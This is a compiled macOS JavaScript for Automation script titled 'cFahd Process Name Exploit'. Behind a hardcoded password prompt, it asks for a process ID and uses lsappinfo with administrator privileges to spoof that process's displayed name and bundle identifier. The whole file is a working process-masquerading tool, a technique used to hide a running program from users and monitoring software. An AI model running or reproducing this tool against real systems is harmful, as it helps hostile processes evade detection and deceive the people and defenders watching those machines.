JsOsaDAS1 .001 .00 bplist00Ñ Vscript_.app = Application.currentApplication()
app.includeStandardAdditions = true;

var app = Application.currentApplication()
app.includeStandardAdditions = true

var response = app.displayDialog("Please enter password: ", {
    defaultAnswer: "",
    withIcon: "stop",
    buttons: ["Cancel", "Continue"],
    defaultButton: "Continue",
    hiddenAnswer: true
})
if (response.textReturned == "cfahd") {
    app.doShellScript("open -b com.apple.ActivityMonitor")
    var responsePID = app.displayDialog("Application Process ID: ", {
        defaultAnswer: "",
        withIcon: "note",
        buttons: ["Cancel", "Continue"],
        defaultButton: "Continue"
    })
    var responseName = app.displayDialog("Spoofed Application Name: ", {
        defaultAnswer: "",
        withIcon: "note",
        buttons: ["Cancel", "Continue"],
        defaultButton: "Continue"
    })
    var code = "/usr/bin/lsappinfo setinfo  " + (responsePID.textReturned) + " --name " + (responseName.textReturned)
    app.doShellScript(code, {
        administratorPrivileges: true
    });


    var alertText1 = "cFahd Process Name Exploit"
    var alertMessage1 = "View extracted application information from " + (app.currentDate()) + " helpful for proper bundle identifier."
    var resultAns1 = app.displayAlert(alertText1, {
        message: alertMessage1,
        as: "critical",
        buttons: ["Exit", "View", "Continue"],
        defaultButton: "View",
        cancelButton: "Exit"
    })

    if (resultAns1.buttonReturned == "View") {
        app.doShellScript("open /usr/bin/lsappinfo")
    }

    var responseBundle = app.displayDialog("Spoofed Application Bundle Identifier: ", {
        defaultAnswer: "",
        withIcon: "note",
        buttons: ["Cancel", "Continue"],
        defaultButton: "Continue"
    })

    var code = "/usr/bin/lsappinfo setinfo  " + (responsePID.textReturned) + " --bundleid " + (responseBundle.textReturned)
    app.doShellScript(code, {
        administratorPrivileges: true
    });

    var alertText = "cFahd Process Name Exploit"
    var alertMessage = "Tasks completed. Would you like to continue to see updated application information?"
    var resultAns = app.displayAlert(alertText, {
        message: alertMessage,
        as: "critical",
        buttons: ["Exit", "View"],
        defaultButton: "View",
        cancelButton: "Exit"
    })

    if (resultAns.buttonReturned == "View") {
        app.doShellScript("open /usr/bin/lsappinfo")
    }

} else {
    app.displayDialog("Error: Incorrect Passoword!")
}
